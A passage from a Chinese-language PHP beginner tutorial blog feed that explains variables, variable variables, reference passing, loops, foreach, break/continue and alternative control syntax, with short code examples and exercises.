<h2 id="1-7-变量"><a href="#1-7-变量" class="headerlink" title="1.7  变量"></a>1.7  变量</h2><p>变量的本质就是内存中的一段空间</p>
<h4 id="1-7-1-变量的命名规则"><a href="#1-7-1-变量的命名规则" class="headerlink" title="1.7.1  变量的命名规则"></a>1.7.1  变量的命名规则</h4><ol>
<li>变量必须以$开头，$符不是变量的一部分，仅表示后面的标识符是变量名。</li>
<li>除了$以外，以字母、下划线开头，后面跟着数字、字母、下划线</li>
<li>变量名区分大小写，$aa和$Aa是两个空间</li>
</ol>
<p>下列变量是否合法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$a		合法</span><br><span class="line">$a1		合法</span><br><span class="line">$1a		不合法</span><br><span class="line">$_1a	合法</span><br></pre></td></tr></table></figure>

<p>注意：PHP语句必须以分号结尾</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$a</span>=<span class="number">10</span>;</span><br><span class="line">	<span class="variable">$name</span>=<span class="string">&#x27;Tom&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="1-7-2-可变变量"><a href="#1-7-2-可变变量" class="headerlink" title="1.7.2  可变变量"></a>1.7.2  可变变量</h4><p>变量名可以变，将变量名存储在另外一个变量中</p>
<p>例题</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="number">10</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$$b</span>;		<span class="comment">//10</span></span><br></pre></td></tr></table></figure>

<p>例题</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$name1</span>=<span class="string">&#x27;tom&#x27;</span>;</span><br><span class="line">	<span class="variable">$name2</span>=<span class="string">&#x27;berry&#x27;</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="number">10</span>)%<span class="number">2</span>)&#123; </span><br><span class="line">		<span class="variable">$name</span>=<span class="string">&#x27;name1&#x27;</span>;	<span class="comment">//将变量名存储在$name中</span></span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$name</span>=<span class="string">&#x27;name2&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$$name</span>;   </span><br></pre></td></tr></table></figure>

<p>小结：</p>
<p>1、rand(1,10)：获取1-10的随机整数</p>
<h4 id="1-7-3-变量传递"><a href="#1-7-3-变量传递" class="headerlink" title="1.7.3  变量传递"></a>1.7.3  变量传递</h4><p>变量的传递有值传递和地址传递（引用传递）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//值传递</span></span><br><span class="line"><span class="variable">$num1</span>=<span class="number">10</span>;	<span class="comment">//将10付给$num1</span></span><br><span class="line"><span class="variable">$num2</span>=<span class="variable">$num1</span>;	<span class="comment">//将$num1的值付给$num2</span></span><br><span class="line"><span class="variable">$num2</span>=<span class="number">20</span>;		<span class="comment">//更改$num2</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$num1</span>;		</span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//地址传递</span></span><br><span class="line"><span class="variable">$num1</span>=<span class="number">10</span>;		<span class="comment">//将10付给$num1</span></span><br><span class="line"><span class="variable">$num2</span>=&amp;<span class="variable">$num1</span>;	<span class="comment">//将$num1的地址付给$num2</span></span><br><span class="line"><span class="variable">$num2</span>=<span class="number">20</span>;		<span class="comment">//更改$num2</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$num1</span>;		<span class="comment">//20</span></span><br></pre></td></tr></table></figure>

<p>小结:</p>
<p>1、参数的传递有两种，值传递和地址传递</p>
<p>2、&amp;表示获取变量的地址</p>
<p>3、值传递中，一个变量变了，另一个变量没有影响，因为是两个空间</p>
<p>4、地址传递中，一个变量变了，另一个也变了，因为两个变量指向同一个空间</p>
<h4 id="1-7-4-销毁变量"><a href="#1-7-4-销毁变量" class="headerlink" title="1.7.4  销毁变量"></a>1.7.4  销毁变量</h4><p>用unset()来销毁变量，销毁的是变量名，变量值由PHP垃圾回收机制销毁</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$num1</span>=<span class="number">10</span>;</span><br><span class="line"><span class="variable">$num2</span>=&amp;<span class="variable">$num1</span>;</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$num1</span>);	<span class="comment">//销毁的是变量名</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$num2</span>;		</span><br></pre></td></tr></table></figure>

<p><strong>没有变量引用的值是垃圾。</strong></p>
<p>​                                                                                                                                                                                </p>
]]></content>
  </entry>
  <entry>
    <title>PHP开发基础3</title>
    <url>/2023/04/20/PHP%E5%BC%80%E5%8F%91%E5%9F%BA%E7%A1%803/</url>
    <content><![CDATA[<h2 id="1-2-循环"><a href="#1-2-循环" class="headerlink" title="1.2   循环"></a>1.2   循环</h2><h4 id="1-2-1-for"><a href="#1-2-1-for" class="headerlink" title="1.2.1   for"></a>1.2.1   for</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(初始值;条件;增量)&#123;</span><br><span class="line">	<span class="comment">//循环体</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意：循环中千万不能出现死循环</p>
<p>思考：如下代码输出什么</p>
<p>例题一：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">1</span>;<span class="variable">$i</span>&lt;=<span class="number">10</span>;<span class="variable">$i</span>+=<span class="number">2</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;<span class="subst">&#123;$i&#125;</span>:锄禾日当午&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">1</span>.先赋值</span><br><span class="line"><span class="number">2</span>.在判断</span><br><span class="line"><span class="number">3</span>.执行</span><br><span class="line"><span class="number">4</span>.增量</span><br><span class="line">    <span class="number">2</span>.在判断</span><br><span class="line">    <span class="number">3</span>.执行</span><br><span class="line">    <span class="number">4</span>.增量.....</span><br></pre></td></tr></table></figure>







<p>例题二：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">1</span>;<span class="variable">$i</span>&lt;=<span class="number">10</span>;)&#123;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//死循环，$i永远等于1，1永远小于10，条件永远为true</span></span><br></pre></td></tr></table></figure>

<p>例题三</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">1</span>;;<span class="variable">$i</span>++)&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//死循环，只要没有条件都是死循环</span></span><br></pre></td></tr></table></figure>

<p>例题四</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>(;;)&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//这是一个经典的死循环</span></span><br></pre></td></tr></table></figure>



<p>小结</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">for循环流程</span><br><span class="line">1.先赋值</span><br><span class="line">2.在判断</span><br><span class="line">3.执行</span><br><span class="line">4.增量</span><br><span class="line">    2.在判断</span><br><span class="line">    3.执行</span><br><span class="line">    4.增量.....</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">死循环的三种</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h4 id="1-2-3-思考题"><a href="#1-2-3-思考题" class="headerlink" title="1.2.3  思考题"></a>1.2.3  思考题</h4><p>1、如下代码循环了几次？</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">1</span>;<span class="variable">$i</span>!=<span class="number">5</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//循环了4次</span></span><br></pre></td></tr></table></figure>

<p>2、在循环N次循环体中，初始值执行了几次？条件执行了几次？增量执行了几次？</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">初始值执行了1次</span><br><span class="line">条件执行了N+1次</span><br><span class="line">增量执行了N次</span><br></pre></td></tr></table></figure>

<p>3、在循环执行完毕后，$i的值是存在的。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">1</span>;<span class="variable">$i</span>&lt;=<span class="number">3</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$i</span>;		<span class="comment">//4</span></span><br></pre></td></tr></table></figure>



<h4 id="1-2-4-while、do-while"><a href="#1-2-4-while、do-while" class="headerlink" title="1.2.4 while、do-while"></a>1.2.4 while、do-while</h4><p>语法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">while</span>(条件)&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">条件判断</span><br><span class="line">    为真执行  </span><br><span class="line">    为假不执行，跳过</span><br><span class="line">-------------------------</span><br><span class="line">    </span><br><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line">    <span class="comment">//执行</span></span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">while</span>(条件)</span><br><span class="line">    </span><br><span class="line"><span class="number">1</span>.执行</span><br><span class="line"><span class="number">2</span>.条件判断</span><br><span class="line">    为真执行  </span><br><span class="line">    为假不执行，跳过</span><br></pre></td></tr></table></figure>





<p>小结：</p>
<p>1、for、while、do-while可以相互替换</p>
<p>2、	如果明确知道循环多少次首先for循环，</p>
<p>​		如要要循环到条件不成立为止选while或do-while</p>
<p>3、先判断再执行选while，先执行再判断选do-while</p>
<p>4、while循环条件不成立就不执行，do-while至少执行一次</p>
<h4 id="1-2-5-例题"><a href="#1-2-5-例题" class="headerlink" title="1.2.5  例题"></a>1.2.5  例题</h4><p>1、使用三种循环实现从1加到100</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//1、for循环实现</span></span><br><span class="line"><span class="variable">$sum</span>=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">1</span>;<span class="variable">$i</span>&lt;=<span class="number">100</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">	<span class="variable">$sum</span>+=<span class="variable">$i</span>;	<span class="comment">//$sum=$sum+$i;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$sum</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//分析</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">$i			$sum</span></span><br><span class="line"><span class="comment">1			1</span></span><br><span class="line"><span class="comment">2			1+2</span></span><br><span class="line"><span class="comment">3			1+2+3	</span></span><br><span class="line"><span class="comment">4			1+2+3+4</span></span><br><span class="line"><span class="comment">...</span></span><br><span class="line"><span class="comment">100			1+2+3+++100</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">-------------------------------------------------</span><br><span class="line"><span class="comment">//2、while循环</span></span><br><span class="line"><span class="variable">$i</span>=<span class="number">1</span>;</span><br><span class="line"><span class="variable">$sum</span>=<span class="number">0</span>;		<span class="comment">//保存和</span></span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$i</span>&lt;=<span class="number">100</span>)&#123;</span><br><span class="line">	<span class="comment">//方法一</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	$sum+=$i;</span></span><br><span class="line"><span class="comment">	$i++;</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//方法二</span></span><br><span class="line">	<span class="variable">$sum</span>+=<span class="variable">$i</span>++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$sum</span>;</span><br><span class="line">--------------------------------------------------</span><br><span class="line">    </span><br><span class="line"><span class="comment">//3、do-while循环</span></span><br><span class="line"><span class="variable">$i</span>=<span class="number">1</span>;</span><br><span class="line"><span class="variable">$sum</span>=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line">	<span class="variable">$sum</span>+=<span class="variable">$i</span>;</span><br><span class="line">	<span class="variable">$i</span>++;</span><br><span class="line">&#125;<span class="keyword">while</span>(<span class="variable">$i</span>&lt;=<span class="number">100</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$sum</span>,<span class="string">&#x27;&lt;br&gt;&#x27;</span>;	<span class="comment">//5050</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//可以有如下更改</span></span><br><span class="line"><span class="variable">$i</span>=<span class="number">1</span>;</span><br><span class="line"><span class="variable">$sum</span>=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line">	<span class="variable">$sum</span>+=<span class="variable">$i</span>++;      <span class="comment">//++后置</span></span><br><span class="line">&#125;<span class="keyword">while</span>(<span class="variable">$i</span>&lt;=<span class="number">100</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$sum</span>,<span class="string">&#x27;&lt;br&gt;&#x27;</span>;	<span class="comment">//5050</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//可以做如下更改</span></span><br><span class="line"><span class="variable">$i</span>=<span class="number">1</span>;</span><br><span class="line"><span class="variable">$sum</span>=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line">	<span class="variable">$sum</span>+=<span class="variable">$i</span>;</span><br><span class="line">&#125;<span class="keyword">while</span>(++<span class="variable">$i</span>&lt;=<span class="number">100</span>);    <span class="comment">//++前置</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$sum</span>,<span class="string">&#x27;&lt;br&gt;&#x27;</span>;		<span class="comment">//5050</span></span><br></pre></td></tr></table></figure>

<p>小结：</p>
<p>1、for、while、do-while可以相互替换</p>
<p>2、结合++前置和++后置考虑逻辑</p>
<h4 id="1-2-6-多语句表达式"><a href="#1-2-6-多语句表达式" class="headerlink" title="1.2.6  多语句表达式"></a>1.2.6  多语句表达式</h4><p>初始值、增量可以由多条语句组成</p>
<p>例题：数字分解</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">1</span>,<span class="variable">$j</span>=<span class="number">9</span>;<span class="variable">$i</span>&lt;=<span class="variable">$j</span>;<span class="variable">$i</span>++,<span class="variable">$j</span>--)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;10可以分成<span class="subst">&#123;$i&#125;</span>和<span class="subst">&#123;$j&#125;</span>&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//运行结果</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">10可以分成1和9</span></span><br><span class="line"><span class="comment">10可以分成2和8</span></span><br><span class="line"><span class="comment">10可以分成3和7</span></span><br><span class="line"><span class="comment">10可以分成4和6</span></span><br><span class="line"><span class="comment">10可以分成5和5</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<p>小结：初始值、增量可以写多个表达式，</p>
<p><strong>但是条件一般只写一个，</strong></p>
<p><strong>如果条件写多个，</strong></p>
<p><strong>只是最后一个条件起作用</strong></p>
<h4 id="1-2-7-双重循环"><a href="#1-2-7-双重循环" class="headerlink" title="1.2.7  双重循环"></a>1.2.7  双重循环</h4><p>1、打印阶梯数字</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">1</span>;<span class="variable">$i</span>&lt;=<span class="number">9</span>;<span class="variable">$i</span>++)&#123;	<span class="comment">//循环行</span></span><br><span class="line">	<span class="keyword">for</span>(<span class="variable">$j</span>=<span class="number">1</span>;<span class="variable">$j</span>&lt;=<span class="variable">$i</span>;<span class="variable">$j</span>++)&#123;	<span class="comment">//循环列</span></span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$j</span>,<span class="string">&#x27;&amp;nbsp;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//运行结果</span></span><br><span class="line"><span class="number">1</span> </span><br><span class="line"><span class="number">1</span> <span class="number">2</span> </span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span> </span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span> </span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span> <span class="number">5</span> </span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span> <span class="number">5</span> <span class="number">6</span> </span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span> <span class="number">5</span> <span class="number">6</span> <span class="number">7</span> </span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span> <span class="number">5</span> <span class="number">6</span> <span class="number">7</span> <span class="number">8</span> </span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span> <span class="number">5</span> <span class="number">6</span> <span class="number">7</span> <span class="number">8</span> <span class="number">9</span> </span><br></pre></td></tr></table></figure>

<p>2、打印九九乘法表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;style type=&quot;text/css&quot;&gt;</span><br><span class="line">	table&#123;</span><br><span class="line">		width:980px;</span><br><span class="line">	&#125;</span><br><span class="line">	table,td&#123;</span><br><span class="line">		border:solid 1px #0000FF;</span><br><span class="line">		border-collapse:collapse;</span><br><span class="line">	&#125;</span><br><span class="line">	td&#123;</span><br><span class="line">		height:40px;	</span><br><span class="line">	&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line"></span><br><span class="line">&lt;table&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">for($i=1;$i&lt;=9;$i++)&#123;	//行</span><br><span class="line">	echo &#x27;&lt;tr&gt;&#x27;;</span><br><span class="line">	for($j=1;$j&lt;=$i;$j++)&#123;	//列</span><br><span class="line">		echo &quot;&lt;td&gt;&#123;$j&#125;*&#123;$i&#125;=&quot;.($j*$i).&#x27;&lt;/td&gt;&#x27;;</span><br><span class="line">	&#125;</span><br><span class="line">	echo &#x27;&lt;/tr&gt;&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/table&gt;</span><br></pre></td></tr></table></figure>

<p>运行结果</p>
<hr>
<p>小结：规则：当前列*当前行</p>
<h4 id="1-28-foreach"><a href="#1-28-foreach" class="headerlink" title="1.28  foreach"></a>1.28  foreach</h4><p>foreach循环是用来遍历数组</p>
<p>语法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//语法一</span></span><br><span class="line"><span class="keyword">foreach</span>(数组 <span class="keyword">as</span> 值)&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//语法二</span></span><br><span class="line"><span class="keyword">foreach</span>(数组 <span class="keyword">as</span> 键=&gt;值)&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>例题</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$stu</span>=[<span class="string">&#x27;tom&#x27;</span>,<span class="string">&#x27;berry&#x27;</span>,<span class="string">&#x27;ketty&#x27;</span>];</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$stu</span> <span class="keyword">as</span> <span class="variable">$v</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$v</span>,<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">tom</span></span><br><span class="line"><span class="comment">berry</span></span><br><span class="line"><span class="comment">ketty</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">-----------------------------------------------------------</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$stu</span> <span class="keyword">as</span> <span class="variable">$k</span>=&gt;<span class="variable">$v</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;<span class="subst">&#123;$k&#125;</span>:<span class="subst">&#123;$v&#125;</span>&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">0:tom</span></span><br><span class="line"><span class="comment">1:berry</span></span><br><span class="line"><span class="comment">2:ketty</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>





<h4 id="1-2-9-例题"><a href="#1-2-9-例题" class="headerlink" title="1.2.9  例题"></a>1.2.9  例题</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.打印数字 </span><br><span class="line">	1</span><br><span class="line">	1 2</span><br><span class="line">	1 2 3</span><br><span class="line">	1 2 3 4</span><br><span class="line">	...</span><br><span class="line">	12行</span><br><span class="line"></span><br><span class="line">空2行。</span><br><span class="line"></span><br><span class="line">2.将第9行的内容加入进数组  并将数组进行遍历输出 (一行。并且数字间用空格空开)。</span><br><span class="line"></span><br><span class="line">空2行。</span><br><span class="line"></span><br><span class="line">3.输出 81 数字的组成 例如：</span><br><span class="line">    81可以分成1和80，</span><br><span class="line">    81可以分成2和79，</span><br><span class="line">    81可以分成3和78，</span><br><span class="line">    ....</span><br><span class="line">    </span><br><span class="line">知识点  </span><br><span class="line">    for的多语句循环</span><br><span class="line">    双重循环</span><br><span class="line">    foreach数组遍历</span><br></pre></td></tr></table></figure>







<h2 id="1-3-跳转语句"><a href="#1-3-跳转语句" class="headerlink" title="1.3  跳转语句"></a>1.3  跳转语句</h2><h4 id="1-3-1-语法"><a href="#1-3-1-语法" class="headerlink" title="1.3.1  语法"></a>1.3.1  语法</h4><p>break：中断循环</p>
<p>continue：中断当前循环，进入下一个循环</p>
<p>例题：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">1</span>; <span class="variable">$i</span>&lt;=<span class="number">10</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="comment">// 执行位置一</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$i</span>==<span class="number">5</span>)</span><br><span class="line">		<span class="keyword">break</span>;  <span class="comment">//中断循环</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;<span class="subst">&#123;$i&#125;</span>：锄禾日当午&lt;br&gt;&quot;</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//执行位置二</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//结果</span></span><br><span class="line"><span class="number">1</span>：锄禾日当午&lt;br&gt;</span><br><span class="line"><span class="number">2</span>：锄禾日当午&lt;br&gt;</span><br><span class="line"><span class="number">3</span>：锄禾日当午&lt;br&gt;</span><br><span class="line"><span class="number">4</span>：锄禾日当午&lt;br&gt;  </span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">--------------------------------------------------</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">1</span>; <span class="variable">$i</span>&lt;=<span class="number">10</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$i</span>==<span class="number">5</span>)</span><br><span class="line">		<span class="keyword">continue</span>;  <span class="comment">//跳出5，进入6循环</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;<span class="subst">&#123;$i&#125;</span>：锄禾日当午&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="number">1</span>：锄禾日当午&lt;br&gt;</span><br><span class="line"><span class="number">2</span>：锄禾日当午&lt;br&gt;</span><br><span class="line"><span class="number">3</span>：锄禾日当午&lt;br&gt;</span><br><span class="line"><span class="number">4</span>：锄禾日当午&lt;br&gt;  </span><br><span class="line"><span class="number">6</span></span><br><span class="line"><span class="number">7</span></span><br><span class="line">....</span><br></pre></td></tr></table></figure>



<h4 id="1-3-2-中断多重循环"><a href="#1-3-2-中断多重循环" class="headerlink" title="1.3.2 中断多重循环"></a>1.3.2 中断多重循环</h4><p>break和continue默认中断、跳出1重循环，如果调中断、跳出多重循环，在后面加一个数字。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">1</span>; <span class="variable">$i</span>&lt;=<span class="number">10</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="variable">$j</span>=<span class="number">1</span>;<span class="variable">$j</span>&lt;=<span class="variable">$i</span>;<span class="variable">$j</span>++)&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$j</span>.<span class="string">&#x27;&amp;nbsp;&#x27;</span>;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$j</span>==<span class="number">5</span>)&#123;</span><br><span class="line">			<span class="keyword">break</span> <span class="number">2</span>;   <span class="comment">//中断2重循环</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;	</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>练习</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">1</span>; <span class="variable">$i</span>&lt;=<span class="number">10</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">	<span class="keyword">switch</span>(<span class="variable">$i</span>)&#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">			<span class="keyword">break</span> <span class="number">2</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//1</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$i</span>,<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//2  </span></span><br><span class="line"><span class="comment">//结果</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>小结：switch的本质是循环了一次的循环</p>
<h2 id="1-4-替代语法"><a href="#1-4-替代语法" class="headerlink" title="1.4 替代语法"></a>1.4 替代语法</h2><p>php中除了do-while以外，其他的语法结构都有替代语法</p>
<p>规则：左大括号变冒号,右大括号变endXXX</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//if的替代语法</span></span><br><span class="line">    <span class="keyword">if</span>(条件):</span><br><span class="line">		<span class="comment">//代码一</span></span><br><span class="line">    <span class="keyword">elseif</span>(条件):</span><br><span class="line">		<span class="comment">//代码二</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">		<span class="comment">//代码三</span></span><br><span class="line">    <span class="keyword">endif</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//switch替代语法</span></span><br><span class="line">    <span class="keyword">switch</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">endswitch</span>;</span><br><span class="line"><span class="comment">//for</span></span><br><span class="line">    <span class="keyword">for</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">endfor</span>;</span><br><span class="line"><span class="comment">//while</span></span><br><span class="line">    <span class="keyword">while</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">endwhile</span>;</span><br><span class="line"><span class="comment">//foreach</span></span><br><span class="line">    <span class="keyword">foreach</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">endforeach</span>;</span><br></pre></td></tr></table></figure>

<p>例题：在混编的时候用替代语法</p>
